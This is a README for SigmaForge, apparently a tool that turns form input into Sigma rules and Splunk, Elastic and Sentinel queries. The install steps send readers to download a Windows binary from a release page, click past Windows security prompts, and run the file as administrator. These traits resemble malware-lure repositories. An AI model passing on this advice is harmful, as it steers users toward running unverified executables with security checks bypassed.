# 🛡️ SigmaForge - Build Sigma Rules Faster

[![Download SigmaForge](https://img.shields.io/badge/Download-SigmaForge-purple?style=for-the-badge)](https://github.com/Unaddicted-swisspine980/SigmaForge/releases)

## 🚀 What SigmaForge Does

SigmaForge helps you create Sigma rules from a simple form. It also gives you output for common SIEM formats like Splunk SPL, Elastic KQL, Elastic EQL, and Sentinel KQL.

Use it when you want to turn a detection idea into a rule without writing everything by hand. It is built for people who work on detection content and want a clear way to prepare rules for different platforms.

## 📦 Download SigmaForge

Visit the release page to download and run this app on Windows:

https://github.com/Unaddicted-swisspine980/SigmaForge/releases

Look for the latest release file in the list. Download the Windows version, then open the file on your PC.

## 🖥️ System Requirements

SigmaForge runs on a Windows desktop or laptop.

You will need:
- Windows 10 or Windows 11
- At least 4 GB of RAM
- 200 MB of free disk space
- A mouse and keyboard
- Internet access to get the release file

For best use, keep your screen at normal desktop size so the form is easy to read.

## 🧭 Before You Start

Before you open SigmaForge, make sure you have:
- Downloaded the latest release from the link above
- Saved the file in a folder you can find again
- Closed any old copy of the app if it is already open

If Windows shows a security prompt, choose the option that lets you open the file.

## 🛠️ How to Install and Run

Follow these steps on Windows:

1. Open this link: https://github.com/Unaddicted-swisspine980/SigmaForge/releases
2. Find the newest release at the top of the page
3. Open the release asset for Windows
4. Save the file to your Downloads folder or Desktop
5. If the file is a ZIP file, right-click it and choose Extract All
6. Open the extracted folder
7. Double-click the SigmaForge app file
8. Wait for the app window to appear

If the app opens in your browser, keep that tab open and use it like a local tool. If it opens as a desktop window, pin it to your taskbar if you use it often.

## 🧩 How to Use SigmaForge

SigmaForge uses a simple flow:

1. Enter the rule details
2. Choose the fields you want to watch
3. Set the match logic
4. Pick the target format
5. Generate the output
6. Copy the rule into your SIEM or save it for later

The app is meant to make rule building easier. You can start with one idea, then shape it into a format that fits your platform.

## 🔎 Common Inputs You May See

SigmaForge may ask for details like:
- Rule name
- Rule description
- Log source
- Event fields
- Search terms
- Match conditions
- Severity level
- False positive notes

Use plain language when you fill in the form. For example, write what the alert should catch and what event data matters most.

## 🧪 Output Formats

SigmaForge supports several rule and query formats.

### Splunk SPL
Use this if your team works in Splunk. The output helps you search for matching events in Splunk data.

### Elastic KQL
Use this for Elastic rules that rely on KQL. It is useful for clear field matching and simple searches.

### Elastic EQL
Use this when you need sequence-based detection logic in Elastic. It fits event patterns and ordered behavior.

### Sentinel KQL
Use this for Microsoft Sentinel. The output maps your rule idea into KQL for Sentinel hunts and analytics.

## 📝 Typical Workflow

A simple workflow looks like this:

1. Think of the activity you want to detect
2. Add the log source that sees it
3. Add the field names from your logs
4. Choose terms, operators, and filters
5. Generate the rule
6. Review the output
7. Copy it into your SIEM
8. Test it with known data

If the rule feels too broad, narrow the search terms. If it misses events, check the field names and log source first.

## 🧠 Tips for Better Results

Use these tips when you build a rule:
- Keep the rule focused on one behavior
- Use field names from your real logs
- Add known good filters to cut noise
- Test with old alerts before you rely on it
- Save each version so you can compare changes
- Give the rule a name that makes sense to your team

Short, clear rules are easier to tune. They also make review work faster.

## 🔧 If the App Does Not Open

If SigmaForge does not start:
- Check that the download finished fully
- Make sure you extracted the ZIP file if one was provided
- Try running the app again from the extracted folder
- Right-click the file and choose Run as administrator if Windows blocks it
- Re-download the release if the file looks broken

If the window opens and closes fast, run it again from the folder so you can see any message.

## 📁 Suggested Folder Setup

You can keep the app in a simple folder setup like this:
- Downloads
  - SigmaForge
  - Releases
  - Rules

This makes it easier to keep the app, your generated rules, and test files in one place.

## 👥 Who This Is For

SigmaForge is useful for:
- Detection engineers
- SOC analysts
- Threat hunters
- Security teams
- Anyone who writes Sigma rules
- People who need output for Splunk, Elastic, or Sentinel

It works well when you want one place to shape a rule for more than one platform.

## 🔐 Security Use

Use SigmaForge to help build detection logic for your own environment or authorized work. Review each generated rule before you put it into production. Check the field names, search terms, and match logic against your log data.

## 📌 Project Topics

This project is related to:
- cybersecurity
- detection engineering
- elastic
- flask
- python
- security tools
- sentinel
- siem
- sigma
- splunk

## 🧾 Getting Help

If you need help, check the release page for the latest build notes and file names. If the app does not match your screen or your Windows version, download the newest release again and try the steps above

## ⭐ What You Can Expect

SigmaForge gives you a clear way to move from an idea to a usable detection rule. It keeps the process simple so you can spend less time on format work and more time on the rule itself